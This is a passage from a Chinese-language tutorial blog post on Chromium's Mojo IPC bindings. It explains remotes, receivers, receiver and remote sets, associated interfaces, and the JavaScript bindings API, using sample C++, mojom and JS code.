<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;db::mojom::Database&gt; database;</span><br><span class="line"><span class="function">DatabaseImpl <span class="title">db_impl</span><span class="params">(database.BindNewPipeAndPassReceiver())</span></span>;</span><br><span class="line"></span><br><span class="line">mojo::Remote&lt;db::mojom::Table&gt; table1, table2;</span><br><span class="line">database-&gt;AddTable(table1.BindNewPipeAndPassReceiver());</span><br><span class="line">database-&gt;AddTable(table2.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line">table1-&gt;AddRow(<span class="number">1</span>, <span class="string">"hiiiiiiii"</span>);</span><br><span class="line">table2-&gt;AddRow(<span class="number">2</span>, <span class="string">"heyyyyyy"</span>);</span><br></pre></td></tr></table></figure>
<p>请注意，即使它们的<code>mojo::PendingReceiver&lt;db::mojom::Table&gt;</code>端点仍在传输中，我们也可以立即立即开始使用新的Table管道。</p>
<h5 id="Sending-Remote"><a href="#Sending-Remote" class="headerlink" title="Sending Remote"></a>Sending Remote</h5><p>当然我们也可以发送Remotes</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface TableListener &#123;</span><br><span class="line">  OnRowAdded(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, <span class="built_in">string</span> data);</span><br><span class="line"></span><br><span class="line">  AddListener(pending_remote&lt;TableListener&gt; listener);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>生成这样的代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddListener</span><span class="params">(mojo::PendingRemote&lt;TableListener&gt; listener)</span> </span>= <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>使用起来是这样的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mojo::PendingRemote&lt;db::mojom::TableListener&gt; listener;</span><br><span class="line"><span class="function">TableListenerImpl <span class="title">impl</span><span class="params">(listener.InitWithNewPipeAndPassReceiver())</span></span>;</span><br><span class="line">table-&gt;AddListener(<span class="built_in">std</span>::<span class="built_in">move</span>(listener));</span><br></pre></td></tr></table></figure>

<h4 id="Other-Interface-Binding-Types"><a href="#Other-Interface-Binding-Types" class="headerlink" title="Other Interface Binding Types"></a>Other Interface Binding Types</h4><h5 id="Self-owned-Receivers"><a href="#Self-owned-Receivers" class="headerlink" title="Self-owned Receivers"></a>Self-owned Receivers</h5><p>self-owned的receiver作为一个独立的object存在，它拥有一个std::unique_ptr指向其绑定的interface implemention，并且在MessagePipe被关闭或者发生一些错误时，负责任的去delete implemention，所以其将一个interface implemention和MessagePipe绑定到了一起。<br>MakeSelfOwnedReceiver函数被用于创建这样的receiver</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  LoggerImpl() &#123;&#125;</span><br><span class="line">  ~LoggerImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> This doesn't own any Receiver object!</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">mojo::Remote&lt;db::mojom::Logger&gt; logger;</span><br><span class="line">mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;LoggerImpl&gt;(),</span><br><span class="line">                        logger.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line">logger-&gt;Log(<span class="string">"NOM NOM NOM MESSAGES"</span>);</span><br></pre></td></tr></table></figure>
<p>只要logger在系统中的某个位置保持open状态，在另一端绑定的LoggerImpl将存活。</p>
<h5 id="Receiver-Sets"><a href="#Receiver-Sets" class="headerlink" title="Receiver Sets"></a>Receiver Sets</h5><p>在多个client共享同一个implement实例的时候使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module system.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface LoggerProvider &#123;</span><br><span class="line">  GetLogger(Logger&amp; logger);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如此我们就可以使用ReceiverSet去绑定多个Looger pending receiver到单个implement实例</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogManager</span> :</span> <span class="keyword">public</span> system::mojom::LoggerProvider,</span><br><span class="line">                   <span class="keyword">public</span> system::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LogManager</span><span class="params">(mojo::PendingReceiver&lt;system::mojom::LoggerProvider&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">provider_receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~LogManager() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// system::mojom::LoggerProvider:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetLogger</span><span class="params">(mojo::PendingReceiver&lt;Logger&gt; receiver)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    logger_receivers_.Add(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// system::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;system::mojom::LoggerProvider&gt; provider_receiver_;</span><br><span class="line">  mojo::ReceiverSet&lt;system::mojom::Logger&gt; logger_receivers_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="Remote-Sets"><a href="#Remote-Sets" class="headerlink" title="Remote Sets"></a>Remote Sets</h5><p>同理，有时维护一组Remotes很有用，例如一组观察某些事件的client。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> db.mojom;</span><br><span class="line"></span><br><span class="line">interface TableListener &#123;</span><br><span class="line">  OnRowAdded(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, <span class="built_in">string</span> data);</span><br><span class="line">  AddListener(pending_remote&lt;TableListener&gt; listener);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Table的实现可能是这样的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom::Table &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  TableImpl() &#123;&#125;</span><br><span class="line">  ~TableImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Table:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    rows_.insert(&#123;key, data&#125;);</span><br><span class="line">    listeners_.ForEach([key, &amp;data](db::mojom::TableListener* listener) &#123;</span><br><span class="line">      listener-&gt;OnRowAdded(key, data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddListener</span><span class="params">(mojo::PendingRemote&lt;db::mojom::TableListener&gt; listener)</span> </span>&#123;</span><br><span class="line">    listeners_.Add(<span class="built_in">std</span>::<span class="built_in">move</span>(listener));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::RemoteSet&lt;db::mojom::Table&gt; listeners_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int32_t</span>, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; rows_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Associated-Interfaces"><a href="#Associated-Interfaces" class="headerlink" title="Associated Interfaces"></a>Associated Interfaces</h4><ul>
<li>允许在message pipe上运行多个interface，同时保留message的顺序</li>
<li>使receiver可以从多个sequence访问单个message pipe<h5 id="Mojom"><a href="#Mojom" class="headerlink" title="Mojom"></a>Mojom</h5>引入新的类型pending_associated_remote和pending_associated_receiver<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">interface Bar &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qux</span> &#123;</span></span><br><span class="line">  pending_associated_remote&lt;Bar&gt; bar;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Foo &#123;</span><br><span class="line">  <span class="comment">// Uses associated remote.</span></span><br><span class="line">  PassBarRemote(pending_associated_remote&lt;Bar&gt; bar);</span><br><span class="line">  <span class="comment">// Uses associated receiver.</span></span><br><span class="line">  PassBarReceiver(pending_associated_receiver&lt;Bar&gt; bar);</span><br><span class="line">  <span class="comment">// Passes a struct with associated interface pointer.</span></span><br><span class="line">  PassQux(Qux qux);</span><br><span class="line">  <span class="comment">// Uses associated interface pointer in callback.</span></span><br><span class="line">  AsyncGetBar() =&gt; (pending_associated_remote&lt;Bar&gt; bar);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
在每个interface impl/client将使用相同的message pipe，通过传递associated remote/receiver进行通信</li>
</ul>
<h5 id="Passing-pending-associated-receivers"><a href="#Passing-pending-associated-receivers" class="headerlink" title="Passing pending associated receivers"></a>Passing pending associated receivers</h5><p>假设你已经有了一个<code>Remote&lt;Foo&gt; foo</code>，你想要去call <code>PassBarReceiver</code>，你可以这样:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; pending_bar;</span><br><span class="line">mojo::PendingAssociatedReceiver&lt;Bar&gt; bar_receiver = pending_bar.InitWithNewEndpointAndPassReceiver();</span><br><span class="line">foo-&gt;PassBarReceiver(<span class="built_in">std</span>::<span class="built_in">move</span>(bar_receiver));</span><br><span class="line"></span><br><span class="line">mojo::AssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">bar.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(pending_bar));</span><br><span class="line">bar-&gt;DoSomething();</span><br></pre></td></tr></table></figure>
<p>首先代码创建一个Bar类型的associated interface，和之前我们创建的不同在于，associated的两端(bar_receiver和pending_bar)之一，必须通过另一个interface发送，这就是接口和现有message pipe关联的方式。</p>
<p>应该注意的是，在传递bar_receiver之前不能调用<code>bar-&gt;DoSomething()</code>,需要满足FIFO:<br>在接收方，当DoSomething调用的消息到达时，我们希望在处理任何后续消息之前将其分派到对应的<code>AssociatedReceiver&lt;Bar&gt;</code>，如果bar_receiver在后续的消息里，那么消息调度就将陷入死锁。<br>另一方面，一旦发送了<code>bar_receiver</code>，bar就可以使用，而无须等待bar_receiver绑定到具体的implemention。<br>上面的代码也可以写成这样，包一层语法糖</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mojo::AssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">foo-&gt;PassBarReceiver(bar.BindNewEndpointAndPassReceiver());</span><br><span class="line">bar-&gt;DoSomething();</span><br></pre></td></tr></table></figure>
<p>Foo的impl实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> :</span> <span class="keyword">public</span> Foo &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PassBarReceiver</span><span class="params">(mojo::AssociatedReceiver&lt;Bar&gt; bar)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    bar_receiver_.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  Receiver&lt;Foo&gt; foo_receiver_;</span><br><span class="line">  AssociatedReceiver&lt;Bar&gt; bar_receiver_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在这个例子里,bar_receiver_的生命周期和FooImpl息息相关，但是你不必这样做。<br>你可以将bar2传递到另一个序列，然后在那里绑定<code>AssociatedReceiver&lt;Bar&gt;</code>。</p>
<h5 id="Passing-associated-remotes"><a href="#Passing-associated-remotes" class="headerlink" title="Passing associated remotes"></a>Passing associated remotes</h5><p>同理</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">mojo::AssociatedReceiver&lt;Bar&gt; <span class="title">bar_receiver</span><span class="params">(some_bar_impl)</span></span>;</span><br><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">mojo::PendingAssociatedReceiver&lt;Bar&gt; bar_pending_receiver = bar.InitWithNewEndpointAndPassReceiver();</span><br><span class="line">foo-&gt;PassBarRemote(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br><span class="line">bar_receiver.Bind(<span class="built_in">std</span>::<span class="built_in">move</span>(bar_pending_receiver));</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">mojo::AssociatedReceiver&lt;Bar&gt; <span class="title">bar_receiver</span><span class="params">(some_bar_impl)</span></span>;</span><br><span class="line">mojo::PendingAssociatedRemote&lt;Bar&gt; bar;</span><br><span class="line">bar_receiver.Bind(bar.InitWithNewPipeAndPassReceiver());</span><br><span class="line">foo-&gt;PassBarRemote(<span class="built_in">std</span>::<span class="built_in">move</span>(bar));</span><br></pre></td></tr></table></figure>

<h3 id="Mojo-JavaScript-Bindings-API"><a href="#Mojo-JavaScript-Bindings-API" class="headerlink" title="Mojo JavaScript Bindings API"></a>Mojo JavaScript Bindings API</h3><h4 id="Getting-Started-1"><a href="#Getting-Started-1" class="headerlink" title="Getting Started"></a>Getting Started</h4><p>bindings API被定义在mojo namespace里，其实现在<a href="https://source.chromium.org/chromium/chromium/src/+/master:out/Debug/gen/mojo/public/js/mojo_bindings.js" target="_blank" rel="noopener">mojo_bindings.js</a><br>当bindings generator处理mojom IDL文件时，将会生成对应的mojom.js文件。<br>假设我们创建一个<code>//services/echo/public/interfaces/echo.mojom</code>文件和<code>//services/echo/public/interfaces/BUILD.gn</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> test.echo.mojom;</span><br><span class="line"></span><br><span class="line">interface Echo &#123;</span><br><span class="line">  EchoInteger(int32 value) =&gt; (int32 result);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">"//mojo/public/tools/bindings/mojom.gni"</span>)</span><br><span class="line"></span><br><span class="line">mojom(<span class="string">"interfaces"</span>) &#123;</span><br><span class="line">  sources = [</span><br><span class="line">    <span class="string">"echo.mojom"</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过构建如下生成target，来生成bindings。</p>
<ul>
<li>foo_js JavaScript bindings; 被用在compile-time dependency.</li>
<li>foo_js_data_deps JavaScript bindings; 被用在run-time dependency.</li>
</ul>
<p>如果我们编译这个target,这将生成几个source file</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out&#x2F;r services&#x2F;echo&#x2F;public&#x2F;interfaces:interfaces_js</span><br></pre></td></tr></table></figure>
<p>其中与js binding相关的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out&#x2F;gen&#x2F;services&#x2F;echo&#x2F;public&#x2F;interfaces&#x2F;echo.mojom.js</span><br></pre></td></tr></table></figure>
<p>为了使用echo.mojom中的定义，您将需要使用<code>&lt;script&gt;</code>标签在html页面中包括两个文件：</p>
<ul>
<li>mojo_bindings.js: 注意这个文件必须放在所有的<code>.mojom.js</code>文件之前。</li>
<li>echo.mojom.js<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/echo.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoPtr = <span class="keyword">new</span> test.echo.mojom.EchoPtr();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoRequest = mojo.makeRequest(echoPtr);</span></span><br><span class="line"><span class="actionscript"><span class="comment">// ...</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="Interfaces-2"><a href="#Interfaces-2" class="headerlink" title="Interfaces"></a>Interfaces</h4>和C++ bindings API相同的是，我们有</li>
<li><code>mojo.InterfacePtrInfo</code>和<code>mojo.InterfaceRequest</code>封装message pipe的两端，他们分别代表interface连接的client端和service端</li>
<li>对于每个Mojom interface Foo，这也生成一个FooPtr类，它保存一个InterfacePtrInfo，提供了使用InterfacePtrInfo中的message pipe handle发送interface call的方法。</li>
<li><code>mojo.Binding</code>保存一个InterfaceRequest。 它侦听message pipe handle，并将传入的message分发到user-defined的interface实现。</li>
</ul>
<p>让我们考虑上面的echo.mojom示例。下面显示了如何创建Echo interface connection和使用它进行call。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"URL/to/echo.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">EchoImpl</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="actionscript">EchoImpl.prototype.echoInteger = <span class="function"><span class="keyword">function</span><span class="params">(value)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123;<span class="attr">result</span>: value&#125;);</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// Promise.resolve('foo')</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// 粗略可以理解成，但注意这并不严格等价，只是在这里可以这么理解</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// new Promise(resolve =&gt; resolve('foo'))</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServicePtr = <span class="keyword">new</span> test.echo.mojom.EchoPtr();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServiceRequest = mojo.makeRequest(echoServicePtr);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> echoServiceBinding = <span class="keyword">new</span> mojo.Binding(test.echo.mojom.Echo,</span></span><br><span class="line"><span class="actionscript">                                          <span class="keyword">new</span> EchoImpl(),</span></span><br><span class="line">                                          echoServiceRequest);</span><br><span class="line"><span class="actionscript">echoServicePtr.echoInteger(&#123;value: <span class="number">123</span>&#125;).then(<span class="function"><span class="keyword">function</span><span class="params">(response)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(<span class="string">'The result is '</span> + response.result);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="Interface-Pointer-and-Request"><a href="#Interface-Pointer-and-Request" class="headerlink" title="Interface Pointer and Request"></a>Interface Pointer and Request</h5><p>在上面的示例中,test.echo.mojom.EchoPtr是一个interface pointer类，它代表interface connection的client。对于Echo Mojom接口中的方法EchoInteger，在EchoPtr中定义了相应的echoInteger方法（注意，生成的method name的格式为camelCaseWithLowerInitial,即小驼峰,第一个字母小写)<br>这就是实际生成的<a href="https://source.chromium.org/chromium/chromium/src/+/master:out/win-Debug/gen/mojo/public/interfaces/bindings/tests/echo.mojom.js" target="_blank" rel="noopener">echo.mojom.js</a><br>在上面的实例中，echoServiceRequest是一个InterfaceRequest实例，它代表接口连接的server。<br>mojo.makeRequest创建一个message pipe，用pipe的一端填充output参数（可以是InterfacePtrInfo或interface pointer）,返回包装在InterfaceRequest实例中的另一端。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// |output| could be an interface pointer, InterfacePtrInfo or</span></span><br><span class="line"><span class="comment">// AssociatedInterfacePtrInfo.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRequest</span>(<span class="params">output</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (output <span class="keyword">instanceof</span> mojo.AssociatedInterfacePtrInfo) &#123;</span><br><span class="line">    <span class="keyword">var</span> &#123;handle0, handle1&#125; = internal.createPairPendingAssociation();</span><br><span class="line">    output.interfaceEndpointHandle = handle0;</span><br><span class="line">    output.version = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> mojo.AssociatedInterfaceRequest(handle1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (output <span class="keyword">instanceof</span> mojo.InterfacePtrInfo) &#123;</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    output.handle = pipe.handle0;</span><br><span class="line">    output.version = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> mojo.InterfaceRequest(pipe.handle1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">  output.ptr.bind(<span class="keyword">new</span> mojo.InterfacePtrInfo(pipe.handle0, <span class="number">0</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> mojo.InterfaceRequest(pipe.handle1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
